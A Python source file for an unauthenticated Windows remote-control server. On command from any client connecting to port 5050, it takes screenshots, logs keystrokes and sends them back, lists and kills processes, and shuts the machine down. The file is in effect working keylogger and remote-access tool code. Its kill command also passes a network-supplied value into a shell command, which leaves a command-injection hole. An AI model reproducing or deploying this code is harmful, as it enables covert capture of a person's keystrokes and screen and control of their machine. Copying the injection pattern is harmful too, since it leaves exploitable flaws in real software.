import socket
import threading
import pyautogui
import io
import os
import winreg
from pynput import keyboard
import subprocess
import re

HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
FORMAT = 'utf-8'

DISCONNECT_MSG = "!DISCONNECT"
SCREENSHOT_MSG = "!SCREENSHOT"
SHUTDOWN_MSG = "!SHUTDOWN"
REGISTRY_MSG = "!REGISTRY"
KEYLOG_MSG = "!KEYLOG"
GETAPP_MSG = "!GETAPP"
KILLAPP_MSG = "!KILLAPP"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((SERVER, PORT))

keylogger_on = False

def send(connection, msg):
    message = msg.encode(FORMAT)
    msg_len = str(len(message)).encode(FORMAT) 
    msg_len += (b' '*(HEADER - len(msg_len)))
    connection.send(msg_len)
    connection.send(message)

def receive(connection):
    msg_len = connection.recv(HEADER).decode(FORMAT)
    if msg_len:
        msg_len = int(msg_len)
        msg = connection.recv(msg_len).decode(FORMAT)
        return msg
    return ""

def sendScreenShot(connection, address):
    print(f"[{address}] !SCREENSHOT")
    screenshot = pyautogui.screenshot()
    screenshotByteIO = io.BytesIO()
    screenshot.save(screenshotByteIO, format='PNG')
    screenshotByte = screenshotByteIO.getvalue()
    connection.send(str(len(screenshotByte)).encode('utf-8').ljust(64))
    connection.sendall(screenshotByte)

def record_keys(connection, address):
    keys_pressed = []

    def on_press(key):
        nonlocal keys_pressed
        try:
            keys_pressed.append(key.char)
        except AttributeError:
            pass
            # Special key (e.g., Shift, Ctrl, etc.)
            # keys_pressed.append(f'<{key}>'.replace('Key.', ''))
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while (keylogger_on):
        pass
    listener.stop()

    _keylogged = ''.join(keys_pressed)
    send(connection, _keylogged)

def getAppList():
    cmd = ['powershell', 'gps | where {$_.MainWindowTitle } | select Description,Id,Path,@{Name=\'Threads\';Expression={(Get-Process -Id $_.Id).Threads.Count}}']
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, text=True, check=True)
    process_list = []
    
    for line in proc.stdout.splitlines():
        line = line.strip()
        if line:
            try:
                description, app_id, path, threads = re.split(r'\s+', line, maxsplit=3)
                process_list.append({
                    'description': description,
                    'app_id': app_id,
                    'path': path,
                    'threads': threads
                })
            except Exception as e:
                print(f"Error processing line: {line} - {e}")
    
    return (process_list, len(process_list))


def killApp(app_id, connection):
    cmd = f'powershell "Stop-Process -Id {app_id}"'
    try:
        subprocess.run(cmd, shell=True, check=True)
        send(connection, f"App with ID {app_id} has been killed")
    except:
        send(connection, f"Error while killing app with ID {app_id}")

def sendAppList(connection):
    processes, list_len = getAppList()
    send(connection, str(list_len))
    for item in processes:
        send(connection, item["description"])
        send(connection, item["app_id"])
        send(connection, item["path"])
        send(connection, item["threads"])
    print("Done sending")

def handle_client(connection, address):
    print(f"New connection initialized - {address}.")
    while True:
        msg_len = connection.recv(HEADER).decode(FORMAT)
        if msg_len:
            msg_len = int(msg_len)
            msg = connection.recv(msg_len).decode(FORMAT)
            if msg == DISCONNECT_MSG:
                print(f"[{address}] - Connection closed")
                break
            elif msg == GETAPP_MSG:
                sendAppList(connection)
            elif msg == KILLAPP_MSG:
                app_id = receive(connection)
                killApp(app_id, connection)
            elif msg == SCREENSHOT_MSG:
                sendScreenShot(connection, address)
            elif msg == SHUTDOWN_MSG:
                os.system("shutdown /s /t 1")
            elif msg == REGISTRY_MSG:
                pass
            elif msg == KEYLOG_MSG:
                global keylogger_on
                if (not keylogger_on):
                    print(f"[{address}] - KEYLOG START")
                    keylogger_on = True
                    threading.Thread(target=record_keys, args=(connection, address)).start()
                else:
                    print(f"[{address}] - KEYLOG END")
                    keylogger_on = False
            else:
                print(f"[{address}] {msg}")
    print()
    connection.close()

def start():
    server.listen()
    while True:
        connection, address = server.accept()
        threading.Thread(target=handle_client, args=(connection, address)).start()

print(f"[SERVER START] {socket.gethostbyname(socket.gethostname())}")
start()